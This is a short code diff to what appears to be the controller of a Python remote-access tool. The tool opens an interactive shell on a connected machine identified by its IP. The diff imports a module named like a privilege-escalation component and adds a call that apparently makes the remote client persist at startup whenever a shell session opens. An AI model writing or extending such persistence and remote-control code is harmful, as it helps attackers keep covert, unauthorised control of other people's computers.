@@ -1,8 +1,11 @@
 import socket
 from lib import config, server_call as server, string_utils
+import eop_npp as eop
 
 
 def shell(client: socket.socket, ip: str):
+    eop.call_persist_startup(client)
+
     while True:
         func, args = string_utils.extract_command(input(f"* Shell~{ip}: "))
 
